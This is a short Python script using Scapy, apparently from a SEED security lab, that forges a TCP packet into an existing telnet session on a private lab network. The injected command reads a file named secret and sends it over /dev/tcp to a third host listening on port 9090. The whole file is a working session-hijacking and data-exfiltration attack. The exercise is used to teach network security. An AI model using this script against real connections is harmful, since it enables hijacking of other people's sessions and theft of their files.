#!/usr/bin/pytho3n
import sys
from scapy.all import *

print("Sending Session Hijacking Packet.....")
ip = IP(src="10.0.2.6", dst="10.0.2.15")
tcp = TCP(sport=38388, dport=23, flags="A", seq=453864955, ack=1517353808)
data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.4/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
